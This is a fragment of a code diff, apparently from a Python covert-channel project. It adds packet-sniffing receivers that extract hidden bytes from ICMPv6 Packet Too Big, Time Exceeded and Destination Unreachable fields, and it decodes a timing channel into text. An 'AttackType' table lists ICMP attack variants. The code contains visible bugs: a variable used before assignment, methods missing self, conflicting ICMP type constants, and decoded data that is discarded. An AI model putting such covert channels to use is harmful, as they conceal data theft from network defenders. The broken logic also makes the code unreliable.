+                        com.set_threading_Event(event_pktconn)
+                        return 
+        return callback
+
+    def ipv6_time_exceeded(self, ip_host): 
+        if not com.is_IPAddress(ip_host): 
+            raise Exception(f"Argoemnti non corretti")
+        
+        time_exceeded_data=[]
+        TYPE_TIME_EXCEEDED=3 
+        try: 
+            event_pktconn=com.get_threading_Event()
+            interface= mymethods.default_iface() 
+        except Exception as e:
+            raise Exception(f"Exception: {e}")
+        args={
+                "filter":f"icmp6 and (icmp6[0]=={TYPE_TIME_EXCEEDED}) and dst {ip_host.compressed}" 
+                #,"count":1 
+                ,"prn": self.callback_get_time_exceeded(event_pktconn,time_exceeded_data)
+                #,"store":True 
+                ,"iface":interface
+        } 
+        try: 
+            sniffer,pkt_timer=com.sniff_packet(
+                args
+                ,timeout_time=None
+                ,event=event_pktconn
+            ) 
+            com.wait_threading_Event(event_pktconn) 
+        except Exception as e:
+            raise Exception(f"wait_conn_from_attacker: {e}")
+        com.stop_sinffer(sniffer)
+        if com.stop_timer(pkt_timer): 
+            #print("".join(x for x in time_exceeded_data))
+            return True 
+        return False  
+
+
+    def callback_get_packet_to_big(event_pktconn,data):
+        TYPE_PKT_BIG= 2
+        def callback(packet): 
+            field=None 
+            if (layer:=packet.getlayer("IPv6")) is not None:
+                if (layer:=layer.getlayer("ICMPv6PacketTooBig")) is not None: 
+                    if (field:=layer.getfieldval("mtu")) is not None: 
+                        data.append(field.to_bytes(4,"big").decode()) 
+                if (layer:=layer.getlayer("IPerror6")) is not None: 
+                    if (field:=layer.getfieldval("plen")) is not None and field!=0xffff: 
+                        data.append(field.to_bytes(2,"big").decode())
+                    elif field is not None and field==0xffff: 
+                        com.set_threading_Event(event_pktconn)
+                        return
+                layer=(
+                    layer.getlayer("ICMPv6EchoRequest") if layer.getlayer("ICMPv6EchoReply") is None 
+                    else layer.getlayer("ICMPv6EchoReply")
+                )
+                if layer is not None: 
+                    if (field:=layer.getfieldval("id")) is not None and not (field==0 and layer.getfieldval("seq")!=0): 
+                        data.append(field.to_bytes(2,"big").decode()) 
+                    elif field is not None and (field==0 and layer.getfieldval("seq")==1): 
+                        com.set_threading_Event(event_pktconn)
+                        return
+                    #else: print("Caso non considetrato")  
+        return callback
+
+    def ipv6_packet_to_big(self, ip_host): 
+        if not com.is_IPAddress(ip_host): 
+            raise Exception(f"Argoemnti non corretti")
+        
+        timestamp_data=[]
+        TYPE_PKT_BIG= 2 
+        interface= mymethods.default_iface() 
+        args={
+                "filter":f"icmp6 and (icmp6[0]=={TYPE_PKT_BIG}) and dst {ip_host.compressed}" 
+                #,"count":1 
+                ,"prn": self.callback_get_packet_to_big(event_pktconn,timestamp_data)
+                #,"store":True 
+                ,"iface": interface
+            }
+        try:
+            event_pktconn=com.get_threading_Event()
+            sniffer,pkt_timer=com.sniff_packet(
+                args
+                ,timeout_time=None
+                ,event=event_pktconn
+            ) 
+            com.wait_threading_Event(event_pktconn) 
+        except Exception as e:
+            raise Exception(f"wait_conn_from_attacker: {e}")
+        com.stop_sinffer(sniffer)
+        if com.stop_timer(pkt_timer): 
+            #print("".join(x for x in timestamp_data))
+            return True 
+        return False  
+    
+
+    def callback_get_destination_unreachable(event_pktconn,data):
+        TYPE_DESTINATION_UNREACHABLE=3 
+        def callback(packet): 
+            field=None 
+            if (layer:=packet.getlayer("IPv6")) is not None:
+                if (layer:=layer.getlayer("ICMPv6DestUnreach")) is None: 
+                    return
+                if (layer:=layer.getlayer("IPerror6")) is not None: 
+                    if (field:=layer.getfieldval("plen")) is not None and field!=0xffff: 
+                        data.append(field.to_bytes(2,"big").decode())
+                    elif field is not None and field==0xffff: 
+                        com.set_threading_Event(event_pktconn)
+                        return
+                layer=(
+                    layer.getlayer("ICMPv6EchoRequest") if layer.getlayer("ICMPv6EchoReply") is None 
+                    else layer.getlayer("ICMPv6EchoReply")
+                )
+                if layer is not None: 
+                    if (field:=layer.getfieldval("id")) is not None and not (field==0 and layer.getfieldval("seq")==1): 
+                        data.append(field.to_bytes(2,"big").decode()) 
+                    elif field is not None and (field==0 and layer.getfieldval("seq")==1): 
+                        com.set_threading_Event(event_pktconn)
+                        return 
+        return callback
+
+    def ipv6_destination_unreachable(self, ip_host): 
+        if not com.is_IPAddress(ip_host): 
+            raise Exception(f"Argoemnti non corretti")
+        
+        destination_unreachable_data=[]
+        TYPE_DESTINATION_UNREACHABLE=1 
+        try: 
+            event_pktconn=com.get_threading_Event()
+            interface= mymethods.default_iface() 
+        except Exception as e:
+            raise Exception(f"Exception: {e}")
+        args={
+                "filter":f"icmp6 and (icmp6[0]=={TYPE_DESTINATION_UNREACHABLE}) and dst {ip_host.compressed}" 
+                #,"count":1 
+                ,"prn": self.callback_get_destination_unreachable(event_pktconn,destination_unreachable_data)
+                #,"store":True 
+                ,"iface":interface
+        } 
+        try:
+            sniffer,pkt_timer=com.sniff_packet(
+                args
+                ,timeout_time=None
+                ,event=event_pktconn
+            ) 
+            com.wait_threading_Event(event_pktconn) 
+        except Exception as e:
+            raise Exception(f"wait_conn_from_attacker: {e}")
+        com.stop_sinffer(sniffer)
+        if com.stop_timer(pkt_timer): 
+            return True 
+        return False  
+    
+
+    def timeout_timing_covertchannel(event_pktconn): 
+        com.set_threading_Event(event_pktconn)
+        return
+
+    def callback_get_timing_cc(callback_function, event_pktconn,timer,timing_data=[],previous_time=None, numero_bit=0):   
+        if numero_bit<=0:
+            return None   
+    
+        DISTANZA_TEMPI=2 #sec
+        dict_tempi={}
+        dict_tempi.update( [("TEMPO_"+str(index), 3+index*2*DISTANZA_TEMPI)  for index in range(2**numero_bit)])
+        dict_bit={ }
+        dict_bit.update([ ("TEMPO_"+str(index), index)  for index in range(2**numero_bit) ])  
+
+        MINUTE_TIME=0*60+30 #minuti
+        MAX_TIME=max([value for _,value in dict_tempi.items()])+5 
+    
+        def callback(packet):
+            nonlocal previous_time, timer,timing_data, event_pktconn, callback_function
+            nonlocal MAX_TIME, MINUTE_TIME 
+            if previous_time is None: 
+                previous_time=packet.time 
+                timer.cancel()
+                timer=com.get_timeout_timer(MAX_TIME,callback_function) 
+                timer.start() 
+                return  
+            if packet.time is not None: 
+                delta_time=packet.time-previous_time   
+                arr=arr=[(key, abs(delta_time-value)) for key,value in dict_tempi.items()] 
+                min_value=min([y for _,y in arr]) 
+                min_indices = [i for i, v in enumerate(arr) if v[1] == min_value] 
+                timing_data.append(dict_bit.get(arr[min_indices[0]][0]))
+                previous_time=packet.time
+                timer.cancel() 
+                if len(timing_data)%8==0: 
+                    timer=com.get_timeout_timer(MINUTE_TIME,callback_function) 
+                else:
+                    timer=com.get_timeout_timer(MAX_TIME,callback_function) 
+                timer.start()
+        return callback
+
+    def ipv6_timing_cc(self, ip_host, numero_bit=0): 
+        if not com.is_IPAddress(ip_host): 
+            raise Exception(f"Argoemnti non corretti")
+        try:  
+            interface= mymethods.default_iface() 
+            if numero_bit<=0:
+                raise Exception("Numero di bit passato non valido")
+        except Exception as e:
+            raise Exception(f"Exception: {e}")
+        timing_data=[]
+        TYPE_INFORMATION_REQUEST=128
+        TYPE_INFORMATION_REPLY=129
+        last_packet_time=None
+        try: 
+            event_pktconn=com.get_threading_Event()
+            callback_function=lambda: self.timeout_timing_covertchannel(event_pktconn)
+            self.timer_timing_CC=com.get_timeout_timer(None,callback_function) 
+        except Exception as e:
+            raise Exception(f"Exception: {e}")
+        args={
+                "filter":f"icmp6 and (icmp6[0]=={TYPE_INFORMATION_REQUEST} or icmp6[0]=={TYPE_INFORMATION_REPLY}) and dst {ip_host.compressed}" 
+                #,"count":1 
+                ,"prn": self.callback_get_timing_cc(
+                    callback_function
+                    ,event_pktconn
+                    ,self.timer_timing_CC
+                    ,timing_data
+                    ,last_packet_time
+                    ,numero_bit
+                )
+                #,"store":True 
+                ,"iface":interface
+        } 
+        try: 
+            sniffer,pkt_timer=com.sniff_packet(
+                args
+                ,timeout_time=None
+                ,event=event_pktconn
+            ) 
+            com.wait_threading_Event(event_pktconn)   
+            str_data=""
+            for integer in timing_data:
+                str_data+=format(integer, f'0{numero_bit}b') 
+            data="" 
+            for index in range(0, len(str_data), 8):
+                int_data=0
+                for bit in str_data[index:index+8][::-1]:
+                    int_data=int_data<<1|int(bit)
+                data+=chr(int_data)  
+        except Exception as e:
+            raise Exception(f"wait_conn_from_attacker: {e}")
+        com.stop_sinffer(sniffer)
+        if com.stop_timer(pkt_timer): 
+            return True 
+        return False
+
+#-----------------------------------------------------------------------
+class AttackType():
+    attack_dict={ 
+        "ipv4_destination_unreachable":"ipv4_3" 
+        ,"ipv4_source_quench":"ipv4_4"
+        ,"ipv4_redirect":"ipv4_5"  
+        ,"ipv4_timing_channel_1bit":"ipv4__16" 
+        ,"ipv4_timing_channel_2bit":"ipv4_16" 
+        ,"ipv4_timing_channel_4bit":"ipv4_16" 
+
+        ,"ipv4_time_exceeded":"ipv4_11"
+        ,"ipv4_parameter_problem":"ipv4_12" 
+        ,"ipv4_timestamp_request":"ipv4_13"
+        ,"ipv4_timestamp_reply":"ipv4_14"
+        ,"ipv4_information_request":"ipv4_15"
+        ,"ipv4_information_reply":"ipv4_16"  
+
+        ,"ipv6_destination_unreachable":"ipv6_1" 
+        ,"ipv6_packet_to_big":"ipv6_2" 
+        ,"ipv6_time_exceeded":"ipv6_3" 
+        ,"ipv6_parameter_problem":"ipv6_4" 
+        ,"ipv6_timing_channel_1bit":"ipv6_129" 
+        ,"ipv6_timing_channel_2bit":"ipv6_129" 
+        ,"ipv6_timing_channel_4bit":"ipv6_129"
+
+        ,"ipv6_information_request":"ipv6_128" 
+        ,"ipv6_information_reply":"ipv6_129"  
+    } 
+
+
+
+
+
+
+
+
